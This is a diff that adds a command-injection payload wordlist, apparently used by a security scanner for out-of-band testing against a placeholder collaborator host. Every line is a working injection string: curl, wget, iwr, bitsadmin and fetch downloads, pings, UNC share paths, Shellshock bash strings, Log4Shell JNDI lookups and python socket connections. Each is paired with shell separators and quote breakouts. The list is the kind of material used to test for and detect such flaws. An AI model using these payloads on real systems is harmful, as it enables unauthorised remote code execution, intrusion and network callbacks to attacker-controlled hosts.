@@ -1,0 +1,2765 @@
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+ping !-VARIABLE_COLLABORATOR-!&
+ping !-VARIABLE_COLLABORATOR-!&&
+ping !-VARIABLE_COLLABORATOR-!|
+ping !-VARIABLE_COLLABORATOR-!||
+ping !-VARIABLE_COLLABORATOR-!;
+ping !-VARIABLE_COLLABORATOR-!%00
+ping !-VARIABLE_COLLABORATOR-!#
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+ping !-VARIABLE_COLLABORATOR-!&
+ping !-VARIABLE_COLLABORATOR-!&&
+ping !-VARIABLE_COLLABORATOR-!|
+ping !-VARIABLE_COLLABORATOR-!||
+ping !-VARIABLE_COLLABORATOR-!;
+ping !-VARIABLE_COLLABORATOR-!%00
+ping !-VARIABLE_COLLABORATOR-!#
+\\!-VARIABLE_COLLABORATOR-!\share&
+\\!-VARIABLE_COLLABORATOR-!\share&&
+\\!-VARIABLE_COLLABORATOR-!\share|
+\\!-VARIABLE_COLLABORATOR-!\share||
+\\!-VARIABLE_COLLABORATOR-!\share;
+\\!-VARIABLE_COLLABORATOR-!\share%00
+\\!-VARIABLE_COLLABORATOR-!\share#
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+'curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+'wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+'iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+'ping !-VARIABLE_COLLABORATOR-!&
+'ping !-VARIABLE_COLLABORATOR-!&&
+'ping !-VARIABLE_COLLABORATOR-!|
+'ping !-VARIABLE_COLLABORATOR-!||
+'ping !-VARIABLE_COLLABORATOR-!;
+'ping !-VARIABLE_COLLABORATOR-!%00
+'ping !-VARIABLE_COLLABORATOR-!#
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+'wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+'iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+'bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+'ping !-VARIABLE_COLLABORATOR-!&
+'ping !-VARIABLE_COLLABORATOR-!&&
+'ping !-VARIABLE_COLLABORATOR-!|
+'ping !-VARIABLE_COLLABORATOR-!||
+'ping !-VARIABLE_COLLABORATOR-!;
+'ping !-VARIABLE_COLLABORATOR-!%00
+'ping !-VARIABLE_COLLABORATOR-!#
+'\\!-VARIABLE_COLLABORATOR-!\share&
+'\\!-VARIABLE_COLLABORATOR-!\share&&
+'\\!-VARIABLE_COLLABORATOR-!\share|
+'\\!-VARIABLE_COLLABORATOR-!\share||
+'\\!-VARIABLE_COLLABORATOR-!\share;
+'\\!-VARIABLE_COLLABORATOR-!\share%00
+'\\!-VARIABLE_COLLABORATOR-!\share#
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+'() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+'() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+'${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+'python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+"curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+"wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+"iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+"fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+"ping !-VARIABLE_COLLABORATOR-!&
+"ping !-VARIABLE_COLLABORATOR-!&&
+"ping !-VARIABLE_COLLABORATOR-!|
+"ping !-VARIABLE_COLLABORATOR-!||
+"ping !-VARIABLE_COLLABORATOR-!;
+"ping !-VARIABLE_COLLABORATOR-!%00
+"ping !-VARIABLE_COLLABORATOR-!#
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+"curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+"wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
